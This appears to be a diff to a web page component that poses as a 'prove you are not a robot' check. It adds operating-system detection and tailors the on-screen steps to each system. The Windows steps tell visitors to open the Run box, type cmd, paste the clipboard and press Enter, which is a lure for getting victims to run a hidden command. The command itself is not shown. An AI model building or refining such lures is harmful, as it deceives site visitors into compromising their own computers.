@@ -10,6 +10,20 @@ const code = ref('');
 const rejected = ref(false);
 let openTimer = 0;
 
+type Desktop = 'windows' | 'mac' | 'linux';
+
+function visitorDesktop(): Desktop {
+  if (typeof navigator === 'undefined') return 'windows';
+  const nav = navigator as Navigator & { userAgentData?: { platform?: string } };
+  const platform = `${nav.userAgentData?.platform || ''} ${navigator.platform || ''}`;
+  const ua = navigator.userAgent || '';
+  if (/mac/i.test(platform) || /Macintosh|Mac OS X/i.test(ua)) return 'mac';
+  if (!/android/i.test(ua) && (/linux/i.test(platform) || /Linux/i.test(ua))) return 'linux';
+  return 'windows';
+}
+
+const desktop = visitorDesktop();
+
 function start() {
   if (state.value !== 'idle') return;
   state.value = 'checking';
@@ -92,8 +106,19 @@ function verify() {
 
       <p class="human-check__lead">To prove you are not a robot, please:</p>
       <div class="human-check__steps">
-        <ol>
-          <li>Press & hold the <strong>window</strong> <strong>key</strong> + <strong>R</strong>.</li>
+        <ol v-if="desktop === 'mac'">
+          <li>Press the Command key</li>
+          <li>In the verification window</li>
+          <li>Press Return on your keyboard to finish.</li>
+        </ol>
+        <ol v-else-if="desktop === 'linux'">
+          <li>Press the Super key</li>
+          <li>In the verification window</li>
+          <li>Press Enter on your keyboard to finish.</li>
+        </ol>
+        <ol v-else>
+          <li>Press the <strong>window</strong> <strong>key</strong> + <strong>R</strong>.</li>
+          <li>Type <strong>cmd</strong> and press <strong>Enter</strong>.</li>
           <li>In the verification window, press  <strong>Ctrl</strong> + <strong>V</strong>.</li>
           <li>Press Enter on your keyboard to finish.</li>
         </ol>
